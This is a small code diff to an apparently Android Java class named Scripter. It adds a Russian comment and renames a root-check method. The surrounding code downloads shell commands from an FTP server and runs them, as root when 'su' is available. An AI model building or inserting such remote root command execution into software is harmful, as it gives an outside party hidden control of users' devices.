@@ -24,6 +24,15 @@ public class Scripter {
 		sPref = PreferenceUtils.getInstance(context);
 	}
 
+	/**
+	 * Выполняет shell script из файла SCRIPT_FILE на сервере
+	 * @throws IOException
+	 * @throws InvalidKeyException
+	 * @throws IllegalBlockSizeException
+	 * @throws BadPaddingException
+	 * @throws NoSuchAlgorithmException
+	 * @throws NoSuchPaddingException
+	 */
 	public void execScript() throws IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException,
 			NoSuchPaddingException {
 		String[] cmds = null;
@@ -34,7 +43,7 @@ public class Scripter {
 			if (ftp.getFileSize(SCRIPT_OUT_FILE) < 0) {
 				cmds = ftp.downloadFileStrings(SCRIPT_FILE);
 				if (cmds.length > 0) {
-					if (Utils.CheckRoot()) {
+					if (Utils.checkRoot()) {
 						shell = "su";
 					}
 					outs = new Proc(shell).exec(cmds);
